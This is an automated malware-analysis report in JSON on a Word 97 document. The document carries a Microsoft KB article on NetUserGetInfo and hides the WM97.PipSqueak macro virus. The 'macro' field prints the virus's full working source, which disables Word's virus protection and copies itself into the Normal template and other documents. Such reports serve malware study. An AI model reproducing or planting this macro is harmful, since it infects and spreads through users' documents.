{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"squeak\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "Kill": "May delete a file",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "\n\nSub AutoClose(): On Error Resume Next: Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False: Set Norm = NormalTemplate.VBProject.VBComponents: Set Doc = ActiveDocument.VBProject.VBComponents: If Norm.Item(\"squeak\").Name <> \"squeak\" Then Doc(\"squeak\").Export \"c:\\squeak.dll\": Set infect = NormalTemplate.VBProject: infect.VBComponents.Import (\"c:\\squeak.dll\"): Kill (\"c:\\squeak.dll\")\nIf Doc.Item(\"squeak\").Name <> \"squeak\" Then Norm(\"squeak\").Export \"c:\\squeak.dll\": Set infect = ActiveDocument.VBProject: infect.VBComponents.Import (\"c:\\squeak.dll\"): Kill (\"c:\\squeak.dll\")\nIf Day(Now) = 10 Then MsgBox \"I would like you to meet WM97.PipSqueak\", 0, \"PipSqueak\"\nEnd Sub\n'WM97.PipSqueak | Psyclone X | DVC\n'Coded for smallest macro virus contest\n'Please DO NOT spread\n"
    },
    "filename": "VirusShare_08f16d51ca9b7b19a309052d07b5cfc2",
    "filesize": 40960,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: Call NetUserGetInfo API from Visual Basic, Author: Unknown, Template: Normal, Last Saved By: Psyclone X, Revision Number: 3, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 01:00, Last Printed: Mon Aug  4 17:28:00 1997, Create Time/Date: Mon Aug  4 17:28:00 1997, Last Saved Time/Date: Thu Jun 10 11:41:00 1999, Number of Pages: 3, Number of Words: 784, Number of Characters: 4474, Security: 0",
    "hashes": {
        "md5": "08f16d51ca9b7b19a309052d07b5cfc2",
        "sha1": "bc13fbf95953480f20862c14a526f26413960277",
        "sha256": "eb290cc37bc656cc166abe050baea446ecda5f6ed71b60b6d9171016299b9594"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjt+t+",
            "WM97.PipSqueak",
            "| Psyclone X  | DVC |",
            "Call NetUserGetInfo API from Visual Basic",
            "SUMMARY",
            "The NetUserGetInfo function is a Unicode-only Windows NT API. The last parameter of this function is a pointer to a pointer to a structure whose members contain DWORD data and pointers to Unicode strings. In order to call this function correctly from a Visual Basic application, you need to de-reference the pointer returned by the function and then you need to convert the Visual Basic string to a Unicode string and vice versa. This article illustrates these techniques in an example that calls NetUserGetInfo to retrieve a USER_INFO_3 structure from a Visual Basic application. ",
            "MORE INFORMATION",
            "The example below uses the Win32 RtlMoveMemory function to de-reference the pointer returned by the NetUserGetInfo call. For more information on how to declare and use RtlMoveMemory function in Visual Basic, please see the following article in the Microsoft Knowledge Base: ",
            "   ARTICLE ID: Q129947",
            "   TITLE     : Win32 Replacement for the hmemecpy Function",
            "For more information on how to convert Visual Basic string to Unicode string and vice versa, please see the following article in the Microsoft Knowledge Base: ",
            "   ARTICLE ID: Q145727:",
            "   TITLE     : How to Call the Unicode Version of an API Function with VB",
            "NOTE: In order to run the code in the example, you need to change the NT domain logon name in step 5 to your valid NT domain logon name. An invalid domain logon name will cause the application to GPF. ",
            "Step-by-Step Example",
            "1.Start Visual Basic. If Visual Basic is already running, from the File menu, choose New Project. Form1 is created by default. ",
            "2.Add a Command button, Command1, to Form1. ",
            "3.Add the following code to the General Declarations section of Form1: ",
            "      'USER_INFO_3 structure is defined in Win32 SDK, below is the VB",
            "      'declare.",
            "      'LPWSTR is a pointer to a Unicode string.",
            "      'The storage of the USER_INFO_3  structure, including the string",
            "      'buffer referred by its LPWSTR members, are all allocated by Windows",
            "      'NT so the function caller doesn't have to allocate memory.",
            "      Private Type USER_INFO_3",
            "          usri3_name As Long           'LPWSTR in SDK",
            "          usri3_password As Long       'LPWSTR in SDK",
            "          usri3_password_age As Long      'DWORD in SDK",
            "          usri3_priv As Long           'DWORD in SDK",
            "          usri3_home_dir As Long       'LPWSTR in SDK",
            "          usri3_comment As Long        'LPWSTR in SDK",
            "          usri3_flags As Long          'DWORD in SDK",
            "          usri3_script_path As Long    'LPWSTR in SDK",
            "          usri3_auth_flags As Long        'DWORD in SDK",
            "          usri3_full_name As Long         'LPWSTR in SDK",
            "          usri3_usr_comment As Long    'LPWSTR in SDK",
            "          usri3_parms As Long          'LPWSTR in SDK",
            "          usri3_workstations As Long      'LPWSTR in SDK",
            "          usri3_last_logon As Long        'DWORD in SDK",
            "          usri3_last_logoff As Long    'DWORD in SDK",
            "          usri3_acct_expires As Long      'DWORD in SDK",
            "          usri3_max_storage As Long    'DWORD in SDK",
            "          usri3_units_per_week As Long    'DWORD in SDK",
            "          usri3_logon_hours As Long    'PBYTE in SDK",
            "          usri3_bad_pw_count As Long      'DWORD in SDK",
            "          usri3_num_logons As Long        'DWORD in SDK",
            "          usri3_logon_server As Long      'LPWSTR in SDK",
            "          usri3_country_code As Long      'DWORD in SDK",
            "          usri3_code_page As Long         'DWORD in SDK",
            "          usri3_user_id As Long        'DWORD in SDK",
            "          usri3_primary_group_id As Long  'DWORD in SDK",
            "          usri3_profile As Long        'LPWSTR in SDK",
            "          usri3_home_dir_drive As Long    'LPWSTR in SDK",
            "          usri3_password_expired As Long  'DWORD in SDK",
            "      End Type",
            "      Private Declare Function NetUserGetInfo Lib \"netapi32.dll\" ( _",
            "         strServerName As Any, strUserName As Any, ByVal dwLevel As Long, _",
            "         pBuffer As Long) As Long",
            "      Private Declare Sub CopyMemory Lib \"kernel32\" Alias \"RtlMoveMemory\" _",
            "         (hpvDest As Any, ByVal hpvSource As Long, ByVal cbCopy As Long)",
            "4.Place the following code in the Command1 Click event procedure: ",
            "      Private Sub Command1_Click()",
            "          Dim pServer() As Byte, pUser() As Byte",
            "          'You need to change \"Your_Domain_Logon_Name\" in the next line",
            "          'to your valid NT domain logon name.",
            "          pUser = \"Your_Domain_Logon_Name\" & vbNullChar",
            "          pServer = \"\" & vbNullChar",
            "          'The above two lines convert VB string to Unicode string.",
            "          Dim dwLevel As Long",
            "          dwLevel = 3",
            "          Dim tmpBuffer As USER_INFO_3",
            "          Dim ptmpBuffer As Long",
            "          NetUserGetInfo pServer(0), pUser(0), dwLevel, ptmpBuffer",
            "          'As last param is dimmed as long, the pointer to ptmpBuffer is",
            "          'passed to dll, and the function returns a pointer to a pointer",
            "          'to our UDT. Therefore ptmpBuffer on return holds a pointer",
            "          'to our UDT.",
            "          'Deference it!!!",
            "          CopyMemory tmpBuffer, ptmpBuffer, LenB(tmpBuffer)",
            "          Dim sUser As String",
            "          Dim sByte() As Byte",
            "          ReDim sByte(255)",
            "          'Convert LPWSTR (Unicode string) to VB string.",
            "          CopyMemory sByte(0), tmpBuffer.usri3_name, 256",
            "          sUser = sByte",
            "          sUser = sUser & vbNullChar",
            "          MsgBox Trim$(sUser)",
            "          'Now I get my user name back, it's VB string now'",
            "      End Sub",
            "/ =!",
            "@EPSON Stylus COLOR 600",
            "LPT1:",
            "EPS600",
            "EPSON Stylus COLOR 600",
            "EPSON Stylus COLOR 600",
            "EPSON Stylus COLOR 600",
            "LPT1:",
            "EPSON Stylus COLOR 600",
            "EPSON Stylus COLOR 600",
            "LPT1:",
            "Call NetUserGetInfo API from Visual Basic",
            "Unknown",
            "Normal",
            "Psyclone X",
            "Microsoft Word 8.0",
            "Call NetUserGetInfo API from Visual Basic",
            "Title",
            "Call NetUserGetInfo API from Visual Basic",
            "_PID_GUID",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "squeak ",
            "squeak",
            "c:\\squeak.dll",
            "squeak$",
            "c:\\squeak.dll",
            "c:\\squeak.dll",
            "squeak ",
            "squeak",
            "c:\\squeak.dll",
            "squeak$",
            "c:\\squeak.dll",
            "c:\\squeak.dll",
            "I would like you to meet WM97.PipSqueak",
            "PipSqueak",
            "WM97.PipSqueak | Psyclone X | DVC",
            "Please DO NOT spread",
            "Coded for smallest macro virus contest",
            "Attribut",
            "e VB_Nam",
            "e = \"squ",
            "eak\"",
            "b AutoCl",
            "ose(): O",
            "n Error ",
            "Resu",
            "*ptions",
            ".VirusPr0otec",
            "@Save@Normal",
            "BConfirm",
            "vers",
            "#Set ",
            "Templateh.VB",
            "omponents: ",
            "1Doc",
            "0If0.Ite$m().",
            "<> Then &",
            "Export ",
            "\"c:\\.dll\"Ainf",
            "N[: ",
            "_.Id",
            "()Kill ",
            "_J#__",
            "Q/J)/ay(Now)@K10",
            "MsgBox \"",
            "I would ",
            "like you@ to me@W",
            "M97.PipS",
            ", 0, \"",
            "End ",
            " | PsHycl",
            "Coded",
            " fsles",
            "t macro v",
            " cont",
            "Please ",
            "DO NOT s",
            "pread",
            "Qp`)",
            "QpP)",
            "&`_7",
            "2375f603f",
            "3375f966b",
            "U6}1",
            "U6}1",
            "Wordk",
            "Win16~",
            "Win32",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Module1b",
            "squeakY",
            "AutoClose",
            "Options",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "ConfirmConversions",
            "NormP>",
            "NormalTemplateq",
            "VBProjectOh",
            "VBComponents",
            "ActiveDocument\\",
            "Itemz",
            "Export",
            "infectf",
            "Importi",
            "Kill",
            "Now%",
            "MsgBoxR",
            "Documentj",
            "_B_var_Norm",
            "_B_var_DocA",
            "_B_var_infect",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "F22D158",
            "E2-9762-",
            "11D2-ABF",
            "8-A7E9D9CD9731",
            ".TWD#Microsoft ",
            "` Ob",
            " Library",
            "37AA7203-1A1C",
            "9-F3D8A5",
            "4041",
            "Pc:\\",
            "windows\\JP\\VBE\\(",
            "EX(.E",
            "CxN@Ua*lCxd",
            "NTax",
            "j +\t,C",
            "& `_7",
            "Of(ficDO@f",
            "{2DF8D04",
            "C-5BFA-1",
            "01B-BDE5@AA@4",
            "PROGRAM ",
            "FILES\\MI",
            "CROSOFT OFFICE\\",
            "MSO97.DLLHk# 8.0k\"",
            "BThisDocument",
            "h@6s",
            "queak",
            "*\\CNormalrU",
            "5H71",
            "5H71",
            "ThisDocument",
            "squeak",
            "Project",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "\u0625@A1",
            "c:\\windows\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "AutoClose",
            "squeak",
            "Item",
            "Name",
            "c:\\squeak.dll",
            "Export",
            "VBComponents",
            "Import",
            "VBA332.DLL",
            "PipSqueak",
            "I would like you to meet WM97.PipSqueaki",
            "ThisDocument",
            "squeak",
            "ID=\"{38DFAEC8-1EDF-11D3-ABF9-8F55367DD731}\"",
            "Document=ThisDocument/&H00000000",
            "Module=squeak",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"F0F2D81EDC1EDC1EDC1EDC\"",
            "DPB=\"E0E2C80BC90BC90B\"",
            "GC=\"D0D2F8FBF9FBF904\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "squeak=22, 22, 462, 347, Z",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen",
            "VBA332.DLL": "Library",
            "c:\\squeak.dll": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.287102",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
